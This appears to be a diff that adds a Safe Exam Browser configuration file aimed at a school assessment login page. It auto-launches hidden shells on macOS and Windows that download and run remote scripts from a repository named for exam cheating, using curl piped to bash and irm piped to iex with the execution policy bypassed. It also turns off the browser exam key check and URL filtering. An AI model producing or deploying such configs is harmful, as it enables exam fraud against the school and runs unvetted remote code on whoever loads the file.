@@ -1,0 +1,94 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+
+    <!-- ── Allowed processes: auto-run on SEB launch ── -->
+    <key>allowedProcessesMacOS</key>
+    <array>
+        <dict>
+            <key>active</key>
+            <true/>
+            <key>autostart</key>
+            <true/>
+            <key>allowUserToChooseApp</key>
+            <false/>
+            <key>strongKill</key>
+            <false/>
+            <key>identifier</key>
+            <string>bash</string>
+            <key>title</key>
+            <string>bash</string>
+            <key>executable</key>
+            <string>/bin/bash</string>
+            <key>arguments</key>
+            <array>
+                <string>-c</string>
+                <string>bash &lt;(curl -fsSL https://raw.githubusercontent.com/Pocimin/wayground-cheat/main/autorun.sh)</string>
+            </array>
+            <key>os</key>
+            <integer>1</integer>
+        </dict>
+    </array>
+
+    <key>allowedProcessesWin</key>
+    <array>
+        <dict>
+            <key>active</key>
+            <true/>
+            <key>autostart</key>
+            <true/>
+            <key>allowUserToChooseApp</key>
+            <false/>
+            <key>strongKill</key>
+            <false/>
+            <key>identifier</key>
+            <string>powershell</string>
+            <key>title</key>
+            <string>powershell</string>
+            <key>executable</key>
+            <string>powershell.exe</string>
+            <key>arguments</key>
+            <array>
+                <string>-ExecutionPolicy</string>
+                <string>Bypass</string>
+                <string>-WindowStyle</string>
+                <string>Hidden</string>
+                <string>-Command</string>
+                <string>irm https://raw.githubusercontent.com/Pocimin/wayground-cheat/main/autorun_windows.ps1 | iex</string>
+            </array>
+            <key>os</key>
+            <integer>2</integer>
+        </dict>
+    </array>
+
+    <!-- ── Basic SEB settings (adjust to match your exam's .seb) ── -->
+    <key>startURL</key>
+    <string>https://asesmen-smpkby.elabschool.sch.id/login/index.php</string>
+
+    <key>browserWindowAllowAddressBar</key>
+    <false/>
+
+    <key>allowQuit</key>
+    <false/>
+
+    <key>hashedQuitPassword</key>
+    <string></string>
+
+    <key>enableBrowserWindowToolbar</key>
+    <false/>
+
+    <key>showTaskBar</key>
+    <false/>
+
+    <key>enableZoomPage</key>
+    <true/>
+
+    <key>URLFilterEnable</key>
+    <false/>
+
+    <key>sendBrowserExamKey</key>
+    <false/>
+
+</dict>
+</plist>
